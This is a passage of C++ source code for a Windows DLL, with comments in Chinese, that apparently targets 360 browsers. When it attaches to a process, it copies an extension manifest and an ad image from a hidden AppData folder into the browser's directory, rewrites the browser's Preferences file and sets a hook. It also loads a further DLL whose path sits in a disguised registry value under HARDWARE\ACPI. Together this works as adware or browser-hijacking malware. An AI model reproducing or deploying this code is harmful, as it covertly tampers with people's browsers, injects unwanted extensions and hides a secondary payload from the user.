		CopyFileA("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\manifest.json", szstr2.c_str(),TRUE);//拷贝插件到浏览器目录
		CopyFileA("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\imgs\\ad.gif", szstr3.c_str(),TRUE);//拷贝插件到浏览器目录
	}

	//Json_Alter2(Preferences);//修改配置文件
	if (Json_Alter2(Preferences) == 10)//没找到 Preferences
	{
		write_file(Preferences, (void*)str_360_ocd_Preferences.c_str(), str_360_ocd_Preferences.length());
	}
}

void patch360chrome2()
{
	char user_data[260] = { 0 };
	GetModuleFileNameA(NULL, user_data, 260);
	char* exe_name=strrchr(user_data, '\\');//浏览器的名字
	if (exe_name == 0)return;
	*exe_name = 0;
	exe_name++;
	strupr(exe_name);

	//禁止重复执行
	//wchar_t key[128] = { 0 };
	//wsprintf(key, L"%hs_preferences", exe_name);
	//int keyval = CFG_GET(key);
	////if (keyval == 1) return;
	//CFG_SET(key, keyval + 1);

	if (!((strstr(exe_name, "360SE") || strstr(exe_name, "360CHROMEX") || strstr(exe_name, "360CHROME"))))//360ChromeX 360Chrome
	{
		return;
	}


	char* tmp = strrchr(user_data, '\\');//先获取一个上级目录的节点
	strcat(user_data, "\\User Data");
	char user_data_path2[260] = { 0 };//exe和user data在相同目录下的路径存放点
	strcpy(user_data_path2, user_data);
	if (GetFileAttributesA(user_data) == -1)//获取本级目录的User Data是否存在 =-1不存在
	{
		*tmp = 0;
		strcat(user_data, "\\User Data");
		if (GetFileAttributesA(user_data) == -1)//如果上一级也没有此目录两个地方都添加
		{
			file_manage(user_data_path2);
		}
	}
	file_manage(user_data);
}

//读注册表 返回值必须free
LPBYTE RegRead(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName)
{
	HKEY hSubkey = 0;
	LPBYTE data = 0;
	//if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
	if (ERROR_SUCCESS == RegOpenKeyEx(hkay, lpSubKey, 0, KEY_QUERY_VALUE, &hSubkey))
	{
		DWORD dwLen = 0;
		RegQueryValueExW(hSubkey, KeyName, 0, 0, 0, &dwLen);
		data = (LPBYTE)malloc(dwLen + 2);
		if (data && dwLen)
		{
			data[dwLen] = 0;
			data[dwLen + 1] = 0;
			RegQueryValueExW(hSubkey, KeyName, 0, 0, data, &dwLen);
		}

		RegCloseKey(hSubkey);
	}
	return data;
}
void loadPug()
{

	wchar_t* PLDLL = 0;

#if _M_X64
	PLDLL = (wchar_t*)RegRead(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI", L"PL64");
#else
	PLDLL = (wchar_t*)RegRead(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI", L"PL32");
#endif // _M_X64

	if (PLDLL)
	{
		if (!GetModuleHandleW(PLDLL))
		{
			LoadLibraryW(PLDLL);
		}
		free(PLDLL);
	}
	
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		setlocale(LC_ALL, "");
		//SHCreateDirectoryExA(0, "X:\\通用工具\\360极速浏览器\\360Chrome\\Chrome\\User Data\\Default\\Extensions\\ocdpkcnlcbkafccebefpkgjdbipcmnbg", 0);
		patch360chrome2();

		//HANDLE hRead= CreateThread(0, 0, patch360chrome, 0,0, 0);
		//CloseHandle(hRead);

		SetHook(); 
		loadPug();

	}

	return TRUE;
}